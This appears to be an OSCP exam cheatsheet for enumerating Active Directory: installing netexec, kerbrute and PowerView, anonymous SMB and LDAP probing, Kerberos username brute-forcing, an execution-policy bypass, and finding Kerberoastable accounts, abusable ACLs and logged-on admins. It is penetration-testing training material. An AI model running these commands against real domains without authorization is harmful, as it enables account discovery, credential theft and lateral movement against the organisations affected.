# Active Directory Enumeration Cheatsheet (OSCP)

> Goal: Identify users, groups, computers, privileges, ACL misconfigurations, and attack paths  
> Methodology: Anonymous → Authenticated → Privilege Escalation

---

## 0. Prep & Tooling (Kali)

### Required Tools
```bash
sudo apt update
sudo apt install -y enum4linux ldap-utils smbclient
```

### NetExec (nxc – CrackMapExec replacement)
```bash
sudo apt install -y netexec
```

### Kerbrute
```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make linux
sudo mv kerbrute /usr/local/bin/
```

### PowerView
```bash
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

Transfer to target:
```bash
impacket-smbserver share .
# On target:
copy \\<KALI-IP>\share\PowerView.ps1 .
```

---

## 1. Anonymous Enumeration (No Credentials)

### SMB
```bash
nxc smb <IP> -u '' -p ''
```

```bash
enum4linux -a -u "" -p "" <IP>
```

Look for:
- Domain name
- Users
- Shares
- Password policy

---

### LDAP
```bash
ldapsearch -x -H ldap://<DC-IP> -s base
```

```bash
ldapsearch -x -H ldap://<DC-IP> \
-D '' -w '' \
-b "DC=corp,DC=com"
```

Look for:
- Naming contexts
- Domain structure
- User/computer objects

---

### Kerberos User Enumeration
```bash
kerbrute userenum \
--dc <DC-IP> \
-d corp.com \
xato-net-10-million-usernames.txt
```

Output:
- Valid domain usernames

---

## 2. Authenticated Enumeration

### SMB Auth Check
```bash
nxc smb <IP> -u user -p password
```

---

## 3. PowerView Enumeration

Load PowerView:
```powershell
powershell -ep bypass
. .\PowerView.ps1
```

---

### Domain Info
```powershell
Get-Domain
```

---

### Users
```powershell
Get-DomainUser -Properties * | select cn,description,title
```

Check:
- description (often passwords)
- servicePrincipalName
- memberOf

---

### Groups
```powershell
Get-DomainGroup | select cn
```

```powershell
Get-DomainGroupMember "Domain Admins"
```

---

### Computers
```powershell
Get-DomainComputer -Domain "corp.com" | Resolve-IPAddress
```

---

### SPNs (Kerberoasting)
```powershell
Get-DomainUser -SPN
```

---

## 4. ACL Enumeration & Abuse

### Interesting ACLs
```powershell
Find-InterestingDomainAcl
```

---

### Full ACL Scan
```powershell
Invoke-ACLScanner
```

---

### Targeted ACLs
```powershell
Find-InterestingDomainAcl |
?{$_.IdentityReferenceName -eq 'stephanie'} |
select IdentityReferenceName,ActiveDirectoryRights,ObjectDN
```

High-value rights:
- GenericAll
- GenericWrite
- WriteDACL
- WriteOwner

---

## 5. Logged-On User Enumeration

### PsLoggedon
```powershell
PsLoggedon.exe \\client75
```

Look for:
- Domain admins logged on to workstations

---

## 6. OSCP Exam Flow

1. Anonymous SMB / LDAP / Kerberos enum  
2. Authenticated user & group enumeration  
3. SPNs → Kerberoast  
4. ACL abuse  
5. Lateral movement  

---

## Quick Wins
- User descriptions
- SPNs on service accounts
- ACL misconfigurations
- Logged-on admins
